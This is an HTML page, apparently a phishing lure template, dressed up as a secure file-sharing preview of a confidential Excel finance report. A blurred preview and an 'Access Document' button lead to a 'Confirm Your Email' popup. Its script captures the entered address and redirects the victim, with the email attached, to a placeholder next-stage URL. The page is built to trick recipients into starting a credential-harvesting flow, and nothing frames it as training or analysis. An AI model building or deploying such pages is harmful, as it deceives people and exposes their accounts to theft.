<!-- ===== Modern File Card + Email Popup ===== -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css" rel="stylesheet">

<style>
  :root {
    --accent: #10793F;
    --accent-2: #10793F;
    --bg: #fff;
    --text: #10793F;
    --muted: #000;
    --line: #10793F;
    --radius: 14px;
    --shadow: 0 8px 24px rgba(0,0,0,.08);
  }

  body {
    font-family: Inter, system-ui, sans-serif;
    background: #f1f1f1;
    margin: 0;
    padding: 20px;
    color: var(--text);
  }

  .file-card {
    max-width: 720px;
    margin: 50px auto;
    padding: 24px;
    background: var(--bg);
    border-radius: var(--radius);
    border: 1px solid var(--line);
    box-shadow: var(--shadow);
  }

  .file-header {
    display: flex;
    align-items: center;
    gap: 8px;
    margin-bottom: 20px;
  }

  .file-icon {
    width: 46px;
    height: 46px;
    border-radius: 7px;
    display: grid;
    place-items: center;
    background: #10793F;
    color: #fff;
    font-size: 28px;
  }

  .file-title h2 { margin: 0; font-size: 20px; font-weight: 700; }
  .file-title p  { margin: 2px 0 0; color: var(--muted); font-size: 14px; }

  .file-preview {
    margin: 20px 0;
    border-radius: var(--radius);
    overflow: hidden;
    position: relative;
    height: 220px;
    border: 1px solid var(--line);
  }
  .file-preview img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    filter: blur(1.3px);
  }
  .file-preview::after {
    content: "Encrypted documents with controlled access";
    position: absolute;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 15px;
    font-weight: 500;
    color: #000;
    background: rgba(255,255,255,.5);
  }

  .file-info {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    margin: 16px 0 20px;
  }
  .file-info span {
    font-size: 12px;
    color: var(--muted);
  }

  .actions { display: flex; justify-content: flex-end; gap: 12px; }
  .btn {
    border: 1px solid var(--line);
    padding: 13px 17px;
    border-radius: 6px;
    background: #fff;
    font-weight: 600;
    cursor: pointer;
  }
  .btn.primary {
    background: linear-gradient(135deg,var(--accent),var(--accent-2));
    color: #fff;
    border: none;
  }

  /* ===== POPUP FORM ===== */
  .popup {
    position: fixed;
    top: 47%; left: 50%;
    transform: translate(-50%, -50%) scale(0.95);
    width: 50%; max-width: 420px;
    background: var(--bg);
    border-radius: var(--radius);
    box-shadow: var(--shadow);
    padding: 24px;
    opacity: 0;
    pointer-events: none;
    transition: .25s ease;
  }
  .popup.active {
    opacity: 1;
    transform: translate(-50%, -50%) scale(1);
    pointer-events: auto;
  }
  .popup h3 {
    margin-top: 0;
    margin-bottom: 7px;
    font-size: 18px;
    font-weight: 700;
    color: black;
  }
  .form-group {
    margin-bottom: 16px;
  }
  .form-group input {
    width: 100%;
    padding: 12px;
    border: 1px solid var(--line);
    border-radius: 7px;
    font-size: 14px;
  }
  .error {
    color: red;
    font-size: 13px;
    display: none;
  }
</style>

<div class="file-card">
  <div class="file-header">
    <div class="file-icon"><i class="ri-file-excel-2-line"></i></div>
    <div class="file-title">
      <h2>FAC7658923-08-2025.xlsx</h2>
      <p>Finance Report - MS Excel</p>
    </div>
  </div>


  <div class="file-preview">
    <img src="/d/nanana.PNG" alt="preview">
  </div>

  <div class="file-info">
    <span> Size: 65 KB</span>
    <span> Modified: 15 Aug 2025</span>
    <span> Confidential</span>
  </div>

  <div class="actions">
    <button class="btn primary" id="openPopup">Access Document</button>
  </div>
</div>

<!-- Popup Email Form -->
<div id="popup" class="popup">
  <h3>Confirm Your Email</h3>
  <form id="emailForm">
    <div class="form-group">
      <input type="email" id="email" name="email" placeholder="Enter your email" required>
    </div>
    <button type="submit" class="btn primary" style="width:100%">Access Now</button>
    <p id="error" class="error">Please enter a valid email.</p>
  </form>
</div>

<script>
  const popup = document.getElementById("popup");
  const openPopup = document.getElementById("openPopup");
  const form = document.getElementById("emailForm");
  const emailInput = document.getElementById("email");
  const errorElm = document.getElementById("error");
  
  openPopup.addEventListener("click", () => popup.classList.add("active"));
  document.addEventListener("click", e => {
    if (!popup.contains(e.target) && e.target !== openPopup) popup.classList.remove("active");
  });

  form.addEventListener("submit", e => {
    e.preventDefault();
    const email = emailInput.value.trim();
    const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]{2,}$/;
    if (!emailRegex.test(email)) {
      errorElm.style.display = "block";
      return;
    }
    errorElm.style.display = "none";
    // âœ… Redirect with email
    window.location.href = "https://example.com/redirect?email=" + encodeURIComponent(email);
  });
</script>
